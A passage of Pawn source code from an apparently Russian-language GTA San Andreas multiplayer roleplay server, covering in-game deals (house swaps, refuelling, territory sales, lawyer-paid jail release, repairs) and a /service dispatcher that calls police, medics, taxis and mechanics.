			if(!HGet(playerid)) return SCM(playerid,COLOR_GREY,"У вас нет дома!"), DeletePVar(playerid,"changehouse_price"), DeletePVar(playerid,"changehouse_"), DeletePVar(i,"_changehouse"), DeletePVar(playerid,"changehouse");
			if(GetPVarInt(playerid,"changehouse_")) return SCM(playerid,COLOR_GREY," Вы уже подтвердили сделку!");
			SetPVarInt(playerid,"changehouse_",1);
			SCM(playerid,0x6495EDFF," Вы подтвердили сделку!");
			SCM(i,0x6495EDFF,"Игрок подтвердил сделку!");
			SCM(i,0x6495EDFF,"(( Введите /(ac)cept house для продолжения! ))");
			return true;
		}
		else */if(GetPVarInt(playerid,"_changehouse"))
		{
			new i = GetPVarInt(playerid,"_changehouse")-1;
			if(!GetPVarInt(i,"changehouse_")) return SCM(playerid,COLOR_GREY," Игрок ещё не подтвердил сделку!");
			if(!HGet(i)) return SCM(playerid,COLOR_GREY," У игрока нет дома!"), DeletePVar(i,"changehouse"), DeletePVar(i,"changehouse_price"), DeletePVar(i,"changehouse_"), DeletePVar(playerid,"_changehouse");
			//HGet(playerid);
			new str[10], str_[10];
			if(HGet(playerid))
			{
				switch(HouseInfo[PTEMP[playerid][pPHouseKey]][hKlass])
				{
				case 0: str = "Nope"; case 1: str = "D"; case 2: str = "C";
				case 3: str = "B"; case 4: str = "A"; default: str = "S";
				}
			} else str = "Нет";
			switch(HouseInfo[PTEMP[i][pPHouseKey]][hKlass])
			{
			case 0: str_ = "Nope"; case 1: str_ = "D"; case 2: str_ = "C";
			case 3: str_ = "B"; case 4: str_ = "A"; case 5: str_ = "S";
			}
			if(HGet(playerid))
			{
				format(string,250,"Вы собираетесь обменяться домами с %s\n\nВаш дом:\n\tНомер дома: [%i]\n\tКласс дома: [%s]\n\nДом игрока:\n\tНомер дома: [%i]\n\tКласс дома: [%s]\n\tДоплата: [%i вирт]",PTEMP[playerid][pName],PTEMP[i][pPHouseKey],str_,PTEMP[playerid][pPHouseKey],str,GetPVarInt(i,"changehouse_price"));
				ShowPlayerDialogEx(i,0, 0,"Обмен домами",string,"Закрыть","");
				format(string,250,"Вы собираетесь обменяться домами с %s\n\nВаш дом:\n\tНомер дома: [%i]\n\tКласс дома: [%s]\n\nДом игрока:\n\tНомер дома: [%i]\n\tКласс дома: [%s]\n\tВаша доплата: [%i вирт]",PTEMP[i][pName],PTEMP[playerid][pPHouseKey],str,PTEMP[i][pPHouseKey],str_,GetPVarInt(i,"changehouse_price"));
				ShowPlayerDialogEx(playerid,1565, 0,"Обмен домами",string,"Обмен","Отмена");
				SetPVarInt(playerid,"changehouse_h",1);
			}
			else
			{
				format(string,250,"Вы собираетесь продать дом %s\n\n\tНомер дома: [%i]\n\tКласс дома: [%s]\n\tДоплата: [%i вирт]",PTEMP[playerid][pName],PTEMP[i][pPHouseKey],str,GetPVarInt(i,"changehouse_price"));
				ShowPlayerDialogEx(i,0, 0,"Продажа дома",string,"Закрыть","");
				format(string,250,"Вы собираетесь купить дом у %s\n\n\tНомер дома: [%i]\n\tКласс дома: [%s]\n\tВаша доплата: [%i вирт]\n\nКупить дом?",PTEMP[i][pName],PTEMP[playerid][pPHouseKey],str_,GetPVarInt(i,"changehouse_price"));
				ShowPlayerDialogEx(playerid,1565, 0,"Продажа дома",string,"Купить","Отмена");
			}
			return true;
		}
	}
	else if(strcmp(x_job, "refill",true) == 0)
	{
		if(RefillOffer[playerid] < 999)
		{
			if(IsPlayerConnected(RefillOffer[playerid]))
			{
				if(PTEMP[playerid][pCash] > RefillPrice[playerid])
				{
					GetPlayerName(RefillOffer[playerid], giveplayer, sizeof(giveplayer));
					GetPlayerName(playerid, sendername, sizeof(sendername));
					new car = GetPlayerVehicleID(playerid);
					format(string, 128, " Автомеханик %s заправил ваш автомобиль на 300 литров за %i вирт",giveplayer,RefillPrice[playerid]);
					SCM(playerid, 0x6495EDFF, string);
					format(string, 128, " Вы заправили машину %s за %i вирт.",sendername,RefillPrice[playerid]);
					SCM(RefillOffer[playerid], 0x6495EDFF, string);
					PTEMP[playerid][pCash] -= RefillPrice[playerid];
					format(string, 128, "~r~-%i", RefillPrice[playerid]);
					GameTextForPlayer(playerid, string, 5000, 1);
					PTEMP[RefillOffer[playerid]][pPayCheck] += RefillPrice[playerid]/2;
					if(!IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER || GetVehicleModel(car) == 481 || GetVehicleModel(car) == 509 || GetVehicleModel(car) == 510) return SCM(playerid,COLOR_YELLOW, " Вы не в автомобиле или этот транспорт нельзя заправить.");
					else
					{
						Fuell[car] = 300;
						OldFuel[playerid] = floatround(Fuell[car]);
						Refueling[playerid] = 0;
					}
					return true;
				}
				else
				{
					SCM(playerid, COLOR_GREY, " Не достаточно денег");
					return true;
				}
			}
			return true;
		}
		else
		{
			SCM(playerid, COLOR_GREY, " Вам не предлагали заправиться!");
			return true;
		}
	}
	else if(strcmp(x_job, "zone",true) == 0)
	{
		if(ZoneOffer[playerid] < 999)
		{
			if(IsPlayerConnected( ZoneOffer[playerid]))
			{
				if(PTEMP[playerid][pCash] > ZonePrice[playerid])
				{
					for(new i = 0;i<130;i++)
					{
						if(PlayerToKvadrat(playerid,GZInfo[i][gCoords][0], GZInfo[i][gCoords][1],GZInfo[i][gCoords][2],GZInfo[i][gCoords][3]))
						{
							if(GZInfo[i][gFrakVlad] != sellzone[playerid]) return SCM(playerid, -1, " Вам не предлагали купить эту территорию");
							GZInfo[i][gFrakVlad] = PTEMP[playerid][pMember];
							GangZoneStopFlashForAll(GZInfo[i][gZone]);
							GangZoneHideForAll(GZInfo[i][gZone]);
							GangZoneShowForAll(GZInfo[i][gZone],GetGangZoneColor(i));
							UpdateTable(TABLE_GANGZONE,"gang_owner",GZInfo[i][gFrakVlad],"id",GZInfo[i][gID]);
						}
					}
					GetPlayerName(ZoneOffer[playerid], giveplayer, sizeof(giveplayer));
					GetPlayerName(playerid, sendername, sizeof(sendername));
					format(string, 128, "Вы купили территорию у %s за %i вирт.",giveplayer, ZonePrice[playerid]);
					SCM(playerid, 0x6495EDFF, string);
					format(string, 128, "Вы продали территорию %s за %i вирт.",sendername,ZonePrice[playerid]);
					SCM(ZoneOffer[playerid], 0x6495EDFF, string);
					PTEMP[playerid][pCash] -= ZonePrice[playerid];
					PTEMP[ZoneOffer[playerid]][pCash]+= ZonePrice[playerid];
					ZoneOffer[playerid] = 999;
					ZonePrice[playerid] = 0;
					sellzone[playerid] = 0;
				}
				else
				{
					SCM(playerid, COLOR_GREY, " У вас недостаточно денег!");
					return true;
				}
			}
			return true;
		}
		else
		{
			SCM(playerid, COLOR_GREY, " Вам ни кто не предлагал территорию!");
			return true;
		}
	}
	else if(strcmp(x_job, "eat",true) == 0)
	{
		if(!GetPVarInt(playerid,"h_id")) return true;
		new i = GetPVarInt(playerid,"h_id")-1;
		if(!IsPlayerConnected(i)) return SCM(playerid,COLOR_GREY,"Игрок не в сети"), DeletePVar(playerid,"h_id");
		if(PTEMP[playerid][pCash] < GetPVarInt(i,"h_price")) return SCM(playerid,COLOR_GREY," Недостаточно средств"), DeletePVar(playerid,"h_id");
		PTEMP[playerid][pSatiety] = 100;
		SendMes(playerid,0x6495EDFF," Вы купили ХотДог у %s за %i вирт.",PTEMP[i][pName],GetPVarInt(i,"h_price"));
		SendMes(playerid,-1," «Сытость» пополнена до %i",PTEMP[playerid][pSatiety]);
		ApplyAnimation(playerid, "FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 0,1);
		SetPlayerChatBubble(playerid,"съел(a) ХотДог",COLOR_PURPLE,30.0,10000);
		SendMes(i,0x6495EDFF," Вы продали ХотДог %s за %i вирт.",PTEMP[playerid][pName],GetPVarInt(i,"h_price"));
		PTEMP[playerid][pCash] -= GetPVarInt(i,"h_price");
		PTEMP[i][pPayCheck] += GetPVarInt(i,"h_price")/2;
		BizzInfo[GetPVarInt(i,"h_contract")][bTill] += GetPVarInt(i,"h_price")/2;
		BizzPay[GetPVarInt(i,"h_contract")] += GetPVarInt(i,"h_price");
		format(string, 16, "~g~+$%i",GetPVarInt(i,"h_price")/2);
		GameTextForPlayer(i, string, 5000, 1);
		format(string, 16, "~r~-$%i",GetPVarInt(i,"h_price"));
		GameTextForPlayer(playerid, string, 5000, 1);
		return DeletePVar(playerid,"h_id");
	}
	else if(strcmp(x_job, "free",true) == 0)
	{
		if(FreeOffer[playerid] < 999)
		{
			if(IsPlayerConnected( FreeOffer[playerid]))
			{
				if(SposobOffer[playerid] == 0)
				{
					if(PTEMP[playerid][pCash] > FreePrice[playerid])
					{
						GetPlayerName(FreeOffer[playerid], giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						format(string, 128, " Вы заплотили адвокату %s %i вирт.",giveplayer, FreePrice[playerid]);
						SCM(playerid, 0x6495EDFF, string);
						format(string, 128, " Вы выпустили %s из тюрьмы за %i вирт.",sendername,FreePrice[playerid]);
						SCM(FreeOffer[playerid], 0x6495EDFF, string);
						PTEMP[playerid][pCash] -= FreePrice[playerid];
						PTEMP[FreeOffer[playerid]][pCash]+= FreePrice[playerid];
						FreeOffer[playerid] = 999;
						FreePrice[playerid] = 0;
						SposobOffer[playerid] = 0;
						SetPlayerInterior(playerid, 0);
						SetPlayerPos(playerid,1553.4962,-1675.2714,16.1953);
						SetPlayerFacingAngle(playerid, 95.0636);
						PTEMP[playerid][pJailTime] = 0;
						PTEMP[playerid][pMestoJail] = 0;
						PTEMP[playerid][pWantedLevel] = 0;
						SCM(playerid, COLOR_YELLOW, " Вы свободны");
						SCM(playerid, COLOR_GREEN, " Вы заплатили свой долг обществу");
						PlayerCuffed[playerid] = 0;
						SetPlayerWantedLevel(playerid, 0);
						SetPlayerVirtualWorld(playerid, 0);
						format(string, sizeof(string), " [Mayor] Адвокат %s выпустил %s из тюрьмы", giveplayer, Name(playerid));
						SendTeamMessage(COLOR_ALLDEPT, string);
						return true;
					}
					else
					{
						SCM(playerid, COLOR_GREY, " У вас недостаточно денег!");
						return true;
					}
				}
				if(SposobOffer[playerid] == 1)
				{
					if(PTEMP[playerid][pBank] > FreePrice[playerid])
					{
						GetPlayerName(FreeOffer[playerid], giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						format(string, 128, " Вы заплотили адвокату %s %i вирт.",giveplayer, FreePrice[playerid]);
						SCM(playerid, 0x6495EDFF, string);
						format(string, 128, " Вы выпустили %s из тюрьмы за %i вирт.",sendername,FreePrice[playerid]);
						SCM(FreeOffer[playerid], 0x6495EDFF, string);
						PTEMP[playerid][pBank] -= FreePrice[playerid];
						PTEMP[FreeOffer[playerid]][pCash]+= FreePrice[playerid];
						FreeOffer[playerid] = 999;
						FreePrice[playerid] = 0;
						SposobOffer[playerid] = 0;
						SetPlayerInterior(playerid, 0);
						SetPlayerPos(playerid,1553.4962,-1675.2714,16.1953);
						SetPlayerFacingAngle(playerid, 95.0636);
						PTEMP[playerid][pJailTime] = 0;
						PTEMP[playerid][pMestoJail] = 0;
						PTEMP[playerid][pWantedLevel] = 0;
						SCM(playerid, COLOR_YELLOW, " Вы свободны");
						SCM(playerid, COLOR_GREEN, " Вы заплатили свой долг обществу");
						PlayerCuffed[playerid] = 0;
						SetPlayerWantedLevel(playerid, 0);
						SetPlayerVirtualWorld(playerid, 0);
						format(string, sizeof(string), " [Mayor] Адвокат %s выпустил %s из тюрьмы", giveplayer, Name(playerid));
						SendTeamMessage(COLOR_ALLDEPT, string);
						return true;
					}
					else
					{
						SCM(playerid, COLOR_GREY, " У вас недостаточно денег!");
						return true;
					}
				}
			}
			return true;
		}
		else
		{
			SCM(playerid, COLOR_GREY, " Вам ни кто не предлагал услуши адвоката!");
			return true;
		}
	}
	else if(strcmp(x_job, "repair",true) == 0)
	{
		if(RepairOffer[playerid] < 999)
		{
			if(PTEMP[playerid][pCash] > RepairPrice[playerid])
			{
				if(IsPlayerInAnyVehicle(playerid))
				{
					if(IsPlayerConnected(RepairOffer[playerid]))
					{
						GetPlayerName(RepairOffer[playerid], giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						RepairCar[playerid] = GetPlayerVehicleID(playerid);
						SetVehicleHealth(RepairCar[playerid], 1000.0);
						AnRepairVehicle(GetPlayerVehicleID(playerid));
						format(string, 128, " Вашу машину отремонтировал(а) за %i вирт, Механик %s", RepairPrice[playerid], giveplayer);
						SCM(playerid, 0x6495EDFF, string);
						format(string, 128, " Вы починили атомобиль %s за %i вирт",sendername,RepairPrice[playerid]);
						SCM(RepairOffer[playerid], 0x6495EDFF, string);
						format(string, 128, " Деньги поступят к вам на банковский счет во время зарплаты");
						SCM(RepairOffer[playerid], 0x6495EDFF, string);
						PTEMP[playerid][pCash] -= RepairPrice[playerid];
						PTEMP[RepairOffer[playerid]][pPayCheck] += RepairPrice[playerid];
						RepairOffer[playerid] = 999;
						RepairPrice[playerid] = 0;
						return true;
					}
					return true;
				}
				return true;
			}
			else
			{
				SCM(playerid, COLOR_GREY, " У вас не хватает денег!");
				return true;
			}
		}
		else
		{
			SCM(playerid, COLOR_GREY, " Вам не предлагали чинить машину!");
			return true;
		}
	}
	else
	{
		return true;
	}
	return true;
}
CMD:service(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	new action[32], key[32], plid;
	if(sscanf(params, "s[32]", action))
	{
        if((PTEMP[playerid][pMember] == 21 || PTEMP[playerid][pMember] == 10 || PTEMP[playerid][pMember] == 1) && GetPVarInt(playerid,"Fraction_Duty"))
		{
			return CallLocalFunction("OnPlayerCommandText", "is", playerid, "/service ac cop");
		}
		else if(PTEMP[playerid][pMember] == 4 || PTEMP[playerid][pMember] == 22 && GetPVarInt(playerid,"Fraction_Duty"))
        {
			return CallLocalFunction("OnPlayerCommandText", "is", playerid, "/service ac medic");
        }
        else if(PTEMP[playerid][pJob] == 4 && GetPVarInt(playerid,"TaxiDuty"))
        {
		 	return CallLocalFunction("OnPlayerCommandText", "is", playerid, "/service ac taxi");
        }
        else if(PTEMP[playerid][pJob] == 2)
		{
			return CallLocalFunction("OnPlayerCommandText", "is", playerid, "/service ac mechanic");
		}
		return SCM(playerid, -1, " Введите: /service [call|ac]  [cop|medic|taxi|mechanic]");
	}
	if(sscanf(params, "s[32]s[32]", action, key))
	{
	    if(!strcmp(action, "call", true))
	    {
	        return ShowPlayerDialogEx(playerid, 9956, DIALOG_STYLE_LIST, "Выберите сервис", "[0] Полиция \n[1] Скорая помощь \n[2] Таксопарк\n[3] Автомастерская", "Выбор", "Отмена");
	    }
	    else return SCM(playerid, -1, " Введите: /service [call|ac]  [cop|medic|taxi|mechanic]");
	}
	if(sscanf(params, "s[32]s[32]d", action, key, plid))
	{
	    if(!strcmp(action, "call", true))
	    {
	        if(!strcmp(key, "cop", true))
	        {
	            if(GetPVarInt(playerid, "call_cop") >= 0 && (gettime() - GetPVarInt(playerid, "call_cop")) <= 600) return SCM(playerid, COLOR_GREY, " Диспетчер уже принял ваш вызов!");
	            new online = 0;
				foreach(i)
				{
					if((PTEMP[i][pMember] == 21 || PTEMP[i][pMember] == 10 || PTEMP[i][pMember] == 1) && GetPVarInt(i,"Fraction_Duty")) online++;
				}
				if(online == 0) return SCM(playerid, 0xbc2c2caa, " Диспетчер: ваше сообщение доставлено, но в данный момент на службе никого нет");
				if((PTEMP[playerid][pMember] == 21 || PTEMP[playerid][pMember] == 10 || PTEMP[playerid][pMember] == 1) && GetPVarInt(playerid,"Fraction_Duty")) return SCM(playerid, COLOR_GREY, " Ошибка. Вы уже работаете полицейским");
				SCM(playerid, COLOR_RED, " Диспетчер: ваше сообщение доставлено, подождите пока примут вызов");
				SetPVarInt(playerid, "call_cop", gettime());
				foreach(i)
				{
					if((PTEMP[i][pMember] == 21 || PTEMP[i][pMember] == 10 || PTEMP[i][pMember] == 1) && GetPVarInt(i,"Fraction_Duty"))
					{
						format(string, 190, " Диспетчер: вызов от %s[%i]. Примерное расстояние %.2f метр(ов)",PTEMP[playerid][pName],playerid, GetDistanceBetweenPlayers(i,playerid));
						SCM(i, COLOR_RED, string);
						SCM(i, -1, " (( Введите '/service' чтобы принять вызов ))");
					}
				}
	        }
	        else if(!strcmp(key, "medic", true))
	        {
	            if(GetPVarInt(playerid, "call_medic") >= 0 && (gettime() - GetPVarInt(playerid, "call_medic")) <= 600) return SCM(playerid, COLOR_GREY, " Диспетчер уже принял ваш вызов!");
	            new online = 0;
				foreach(i)
				{
					if(PTEMP[i][pMember] == 4 && GetPVarInt(i,"Fraction_Duty")) online++;
				}
				if(online == 0) return SCM(playerid, 0xbc2c2caa, " Диспетчер: ваше сообщение доставлено, но в данный момент на службе никого нет");
				if(PTEMP[playerid][pMember] == 4 && GetPVarInt(playerid,"Fraction_Duty")) return SCM(playerid, COLOR_GREY, " Ошибка. Вы уже работаете медиком");
				SCM(playerid, COLOR_RED, " Диспетчер: ваше сообщение доставлено, подождите пока примут вызов");
				SetPVarInt(playerid, "call_medic", gettime());
				foreach(i)
				{
					if(PTEMP[i][pMember] == 4 || PTEMP[i][pMember] == 22 && GetPVarInt(i,"Fraction_Duty"))
					{
						format(string, 190, " Диспетчер: вызов от %s[%i]. Примерное расстояние %.2f метр(ов)",PTEMP[playerid][pName], playerid, GetDistanceBetweenPlayers(i,playerid));
						SCM(i, COLOR_RED, string);
						SCM(i, -1, " (( Введите '/service' чтобы принять вызов ))");
					}
				}
	        }
	        else if(!strcmp(key, "taxi", true))
	        {
	            if(GetPVarInt(playerid, "call_taxi") >= 0 && (gettime() - GetPVarInt(playerid, "call_taxi")) <= 600) return SCM(playerid, COLOR_GREY, " Диспетчер уже принял ваш вызов!");
	            new online = 0;
				foreach(i)
				{
					if(PTEMP[i][pJob] == 4 && GetPVarInt(i,"TaxiDuty")) online++;
				}
				if(online == 0) return SCM(playerid, 0xbc2c2caa, " Диспетчер: ваше сообщение доставлено, но в данный момент на службе никого нет");
				if(PTEMP[playerid][pJob] == 4 && GetPVarInt(playerid,"TaxiDuty")) return SCM(playerid, COLOR_GREY, " Ошибка. Вы уже работаете таксистом");
				SCM(playerid, COLOR_RED, " Диспетчер: ваше сообщение доставлено, подождите пока примут вызов");
				SetPVarInt(playerid, "call_taxi", gettime());
				foreach(i)
				{
					if(PTEMP[i][pJob] == 4 && GetPVarInt(i,"TaxiDuty"))
					{
						format(string, 190, " Диспетчер: вызов от %s[%i]. Примерно расстояние: %.2f метр(ов)",PTEMP[playerid][pName],playerid, GetDistanceBetweenPlayers(i,playerid));
						SCM(i, COLOR_RED, string);
						SCM(i, -1, " (( Введите '/service' чтобы принять вызов ))");
					}
				}
	        }
	        else if(!strcmp(key, "mechanic", true))
	        {
	            if(GetPVarInt(playerid, "call_mechanic") >= 0 && (gettime() - GetPVarInt(playerid, "call_mechanic")) <= 600) return SCM(playerid, COLOR_GREY, " Диспетчер уже принял ваш вызов!");
	            new online = 0;
				foreach(i)
				{
					if(PTEMP[i][pJob] == 2) online++;
				}
				if(online == 0) return SCM(playerid, 0xbc2c2caa, " Диспетчер: ваше сообщение доставлено, но в данный момент на службе никого нет");
				//if(PTEMP[playerid][pJob] == 2) return SCM(playerid, COLOR_GREY, " Ошибка. Вы уже работаете механником");
				SCM(playerid, COLOR_RED, " Диспетчер: ваше сообщение доставлено, подождите пока примут вызов");
                SetPVarInt(playerid, "call_mechanic", gettime());
				foreach(i)
				{
					if(PTEMP[i][pJob] == 2)
					{
						format(string, 190, " Диспетчер: вызов от %s[%i]. Примерное расстояние %.2f метр(ов).",PTEMP[playerid][pName], playerid, GetDistanceBetweenPlayers(i,playerid));
						SCM(i, COLOR_RED, string);
						SCM(i, -1, " (( Введите '/service' чтобы принять вызов ))");
					}
				}
			}
		}
		else if(!strcmp(action, "ac", true))
		{
		    if(!strcmp(key, "cop", true))
		    {
		        if((PTEMP[playerid][pMember] == 21 || PTEMP[playerid][pMember] == 10 || PTEMP[playerid][pMember] == 1) && GetPVarInt(playerid,"Fraction_Duty"))
				{
				    new strs[32], counter = 0;
				    format(string, sizeof(string), "");
				    foreach(i)
				    {
				        if(GetPVarInt(i, "call_cop") > 0)
				        {
				            if(GetPVarInt(i, "call_cop") > (gettime() + 600))
							{
								DeletePVar(i, "call_cop");
								SCM(i, COLOR_RED, " Диспетчер: Извините, Ваш вызов не был принят. Повторите попытку.");
								continue;
							}
							if(((gettime() - GetPVarInt(i, "call_cop"))/60) == 0) format(strs, sizeof(strs), "[%i] %s[%i]\t%i сек\t%.2fм\n", counter, Name(i), i, (gettime() - GetPVarInt(i, "call_cop")), GetDistanceBetweenPlayers(playerid, i));
							format(strs, sizeof(strs), "[%i] %s[%i]\t%i мин\t%.2fм\n", counter, Name(i), i, ((gettime() - GetPVarInt(i, "call_cop"))/60), GetDistanceBetweenPlayers(playerid, i));
							counter++;
							strcat(string, strs);
				        }
				    }
				    if(strlen(string) == 0) return SCM(playerid, COLOR_GREY, " Нет ни одного вызова");
				    ShowPlayerDialog(playerid, 9508, DIALOG_STYLE_LIST, "Вызовы", string, "Принять", "Отмена");
				}
				else return SCM(playerid, COLOR_GREY, " Вы не можете принять вызов");
		    }
		    else if(!strcmp(key, "medic", true))
		    {
                if(PTEMP[playerid][pMember] == 4 || PTEMP[playerid][pMember] == 22 && GetPVarInt(playerid,"Fraction_Duty"))
                {
                    new strs[32], counter = 0;
				    format(string, sizeof(string), "");
				    foreach(i)
				    {
				        if(GetPVarInt(i, "call_medic") > 0)
				        {
				            if(GetPVarInt(i, "call_medic") > (gettime() + 600))
							{
								DeletePVar(i, "call_medic");
								SCM(i, COLOR_RED, " Диспетчер: Извините, Ваш вызов не был принят. Повторите попытку.");
								continue;
							}
							if(((gettime() - GetPVarInt(i, "call_medic"))/60) == 0) format(strs, sizeof(strs), "[%i] %s[%i]\t%i сек\t%.2fм\n", counter, Name(i), i, (gettime() - GetPVarInt(i, "call_medic")), GetDistanceBetweenPlayers(playerid, i));
							format(strs, sizeof(strs), "[%i] %s[%i]\t%i мин\t%.2fм\n", counter, Name(i), i, ((gettime() - GetPVarInt(i, "call_medic"))/60), GetDistanceBetweenPlayers(playerid, i));
							counter++;
							strcat(string, strs);
				        }
				    }
				    if(strlen(string) == 0) return SCM(playerid, COLOR_GREY, " Нет ни одного вызова");
				    ShowPlayerDialog(playerid, 9508, DIALOG_STYLE_LIST, "Вызовы", string, "Принять", "Отмена");
                }
                else return SCM(playerid, COLOR_GREY, " Вы не можете принять вызов");
		    }
			else if(!strcmp(key, "taxi", true))
		    {
                if(PTEMP[playerid][pJob] == 4 && GetPVarInt(playerid,"TaxiDuty"))
                {
                    new strs[64], counter = 0;
				    format(string, sizeof(string), "");
				    foreach(i)
				    {
				        if(GetPVarInt(i, "call_taxi") > 0)
				        {
				            if(GetPVarInt(i, "call_taxi") > (gettime() + 600))
							{
								DeletePVar(i, "call_taxi");
								SCM(i, COLOR_RED, " Диспетчер: Извините, Ваш вызов не был принят. Повторите попытку.");
								continue;
							}
							if(((gettime() - GetPVarInt(i, "call_taxi"))/60) == 0) format(strs, sizeof(strs), "[%i] %s[%i]\t%i сек\t%.2fм\n", counter, Name(i), i, (gettime() - GetPVarInt(i, "call_taxi")), GetDistanceBetweenPlayers(playerid, i));
							else format(strs, sizeof(strs), "[%i] %s[%i]\t%i мин\t%.2fм\n", counter, Name(i), i, ((gettime() - GetPVarInt(i, "call_taxi"))/60), GetDistanceBetweenPlayers(playerid, i));
							counter++;
							strcat(string, strs);
				        }
				    }
				    if(strlen(string) == 0) return SCM(playerid, COLOR_GREY, " Нет ни одного вызова");
				    ShowPlayerDialog(playerid, 9508, DIALOG_STYLE_LIST, "Вызовы", string, "Принять", "Отмена");
                }
                else return SCM(playerid, COLOR_GREY, " Вы не можете принять вызов");
		    }
			else if(!strcmp(key, "mechanic", true))
		    {
                if(PTEMP[playerid][pJob] == 2)
				{
				    new strs[32], counter = 0;
				    format(string, sizeof(string), "");
				    foreach(i)
				    {
				        if(GetPVarInt(i, "call_mechanic") > 0)
				        {
				            if(GetPVarInt(i, "call_mechanic") > (gettime() + 600))
							{
								DeletePVar(i, "call_mechanic");
								SCM(i, COLOR_RED, " Диспетчер: Извините, Ваш вызов не был принят. Повторите попытку.");
								continue;
							}
							if(((gettime() - GetPVarInt(i, "call_mechanic"))/60) == 0) format(strs, sizeof(strs), "[%i] %s[%i]\t%i сек\t%.2fм.\n", counter, Name(i), i, (gettime() - GetPVarInt(i, "call_mechanic")), GetDistanceBetweenPlayers(playerid, i));
							format(strs, sizeof(strs), "[%i] %s[%i]\t%i мин\t%.2fм.\n", counter, Name(i), i, ((gettime() - GetPVarInt(i, "call_mechanic"))/60), GetDistanceBetweenPlayers(playerid, i));
							counter++;
							strcat(string, strs);
				        }
				    }
				    if(strlen(string) == 0) return SCM(playerid, COLOR_GREY, " Нет ни одного вызова");
				    ShowPlayerDialog(playerid, 9508, DIALOG_STYLE_LIST, "Вызовы", string, "Принять", "Отмена");
				}
				else return SCM(playerid, COLOR_GREY, " Вы не можете принять вызов");
		    }
		}
	}
	else
	{
	    if(!strcmp(action, "ac", true))
	    {
			new sendername[32], giveplayer[32];
	        if(plid == INVALID_PLAYER_ID || !IsPlayerConnected(plid)) return SCM(playerid, COLOR_GREY, " Игрок оффлайн!");
	        GetPlayerName(playerid, sendername, sizeof(sendername));
			GetPlayerName(plid, giveplayer, sizeof(giveplayer));
			format(string, 128, " Диспетчер: %s[%i] принял вызов %s[%i]",sendername,playerid,giveplayer,plid);
			if((PTEMP[playerid][pMember] == 21 || PTEMP[playerid][pMember] == 10 || PTEMP[playerid][pMember] == 1) && GetPVarInt(playerid,"Fraction_Duty"))//cop
			{
				foreach(i)
				{
				    if((PTEMP[i][pMember] == 21 || PTEMP[i][pMember] == 10 || PTEMP[i][pMember] == 1) && GetPVarInt(i,"Fraction_Duty") && IsInCopCar(i))
						SCM(i, COLOR_RED, string);
				}
				format(string, 128, " Патрульный %s принял ваш вызов, пожалуйста ждите на месте.",sendername);
				DeletePVar(plid, "call_cop");
			}
			else if(PTEMP[playerid][pMember] == 4 || PTEMP[playerid][pMember] == 22 && GetPVarInt(playerid,"Fraction_Duty"))//medic
	        {
				foreach(i)
				{
				    if(PTEMP[i][pMember] == 4 || PTEMP[i][pMember] == 22 && GetPVarInt(i,"Fraction_Duty"))
						SCM(i, COLOR_RED, string);
				}
				format(string, 128, " Медик %s принял ваш вызов, пожалуйста ждите на месте.",sendername);
				DeletePVar(plid, "call_medic");
	        }
	        else if(PTEMP[playerid][pJob] == 4 && GetPVarInt(playerid,"TaxiDuty"))//taxi
	        {
			 	foreach(i)
				{
				    if(PTEMP[i][pJob] == 4 && GetPVarInt(i,"TaxiDuty"))
						SCM(i, COLOR_RED, string);
				}
				format(string, 128, " Таксист %s принял ваш вызов, пожалуйста ждите на месте.",sendername);
				DeletePVar(plid, "call_taxi");
	        }
	        else if(PTEMP[playerid][pJob] == 2)//mechanic
			{
				foreach(i)
				{
				    if(PTEMP[i][pJob] == 2)
						SCM(i, COLOR_RED, string);
				}
				format(string, 128, " Механик %s принял ваш вызов, пожалуйста ждите на месте.",sendername);
				DeletePVar(plid, "call_mechanic");
			}
			if(isService(playerid))
			{
				SCM(plid, 0x6495EDFF, string);
				new Float:X, Float:Y, Float:Z;
				GetPlayerPos(plid, X, Y, Z);
				SetPlayerCheckpoint(playerid, X, Y, Z, 5);
				updatecheck[playerid] = plid;
				SetTimerEx("kekovich" , 1000, true, "i", playerid);
				CP[playerid] = 777;
			}
	    }
	}
	return true;
}
//#12
CMD:refill(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pJob] != 2) return SCM(playerid, COLOR_GREY, " Вы не Механик!");
	if(gcontract[playerid] != 1) return SCM(playerid, COLOR_GREY, " У вас не подписан контракт с заправкой!");
	if(sscanf(params, "ud", params[0])) return SCM(playerid, -1, " Введите: /refill [playerid]");
	if(!IsPlayerConnected(params[0])) return true;
	if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 525) return SCM(playerid, COLOR_GREY, " Вы не в машине механика");
	if(!ProxDetectorS(8.0, playerid, params[0]) || !IsPlayerInAnyVehicle(params[0])) return true;
	if(params[0] == playerid) return SCM(playerid, COLOR_GREY, " [Ошибка] Вы указали свой ID");
	format(YCMDstr, sizeof(YCMDstr), " Вы предложили %s заправить его машину за %i вирт.",Name(params[0]),cenabenza[playerid]);
	SCM(playerid, 0x6495EDFF, YCMDstr);
	format(YCMDstr, sizeof(YCMDstr), " Механик %s хочет заправить ваш автомобиль за %i вирт, (( /accept refill ))",Name(playerid),cenabenza[playerid]);
	SCM(params[0], 0x6495EDFF, YCMDstr);
	SetPVarInt(playerid,"RefillOffer",params[0]);
	RefillOffer[params[0]] = playerid;
	RefillPrice[params[0]] = cenabenza[playerid];
	return true;
}
CMD:changehouse(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(!HGet(playerid)) return SCM(playerid, COLOR_GREY, " У вас нет дома!");
	new bouse = PTEMP[playerid][pPHouseKey];
	if(sscanf(params, "ud", params[0],params[1])) return SCM(playerid, -1, " Введите: /changehouse [playerid] [цена]");
	if(params[1] < 1 || params[0] > 100000000) return SCM(playerid, COLOR_GREY, " Не менее 1 и не более 100000000 вирт!");
	if(!ProxDetectorS(8.0, playerid, params[0])) return SCM(playerid, COLOR_GREY," Игрок должен находиться рядом с вами!");
	if(GetPVarInt(playerid,"changehouse")) return SCM(playerid,COLOR_GREY," Вы уже предложили кому то купить ваш дом!");
	if(GetPVarInt(params[0],"_changehouse")) return SCM(playerid,COLOR_GREY," Этому игроку уже предложили купить дом!");
